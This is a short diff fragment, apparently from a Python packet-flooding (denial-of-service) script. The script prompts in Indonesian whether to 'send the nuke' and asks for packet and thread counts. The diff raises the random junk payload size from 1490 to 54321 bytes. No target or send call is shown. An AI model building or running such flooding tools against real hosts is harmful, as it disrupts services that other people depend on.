@@ -15,7 +15,7 @@ choice = str(input(" Siap Mengirim Nuklir?(y/n):"))
 times = int(input(" Packets per one connection:"))
 threads = int(input(" Threads:"))
 def run():
-	data = random._urandom(1490)
+	data = random._urandom(54321)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
